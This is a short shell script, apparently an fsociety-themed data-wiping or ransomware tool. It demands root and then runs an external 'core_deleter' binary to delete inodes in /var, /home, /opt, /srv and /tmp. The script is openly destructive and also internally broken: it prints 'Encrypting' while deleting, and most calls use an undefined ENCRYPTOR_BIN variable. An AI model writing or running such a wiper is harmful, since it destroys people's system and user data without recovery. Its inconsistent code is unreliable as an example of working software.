#!/usr/bin/sh

if [ "$(id -u)" -ne 0 ]; then
  echo "[!] Permission denied: required root privilege."
  exit 1
fi

DELETER_BIN="./tools/core_deleter"

if [ ! -f "$DELETER_BIN" ]; then
  echo "[!] Error: Couldn't find ($DELETER_BIN)!"
  exit 1
fi

echo "[*] Encrypting..."

echo "[*] Delete inodes in /var..."
"$DELETER_BIN" /var /fsociety

echo "[*] Delete inodes in /home..."
"$ENCRYPTOR_BIN" /home /fsociety

echo "[*] Delete inodes in /opt..."
"$ENCRYPTOR_BIN" /opt /fsociety

echo "[*] Delete inodes in /srv..."
"$ENCRYPTOR_BIN" /srv /fsociety

echo "[*] Delete inodes in /tmp..."
"$ENCRYPTOR_BIN" /tmp /fsociety

echo "[+] Inodes gone!"
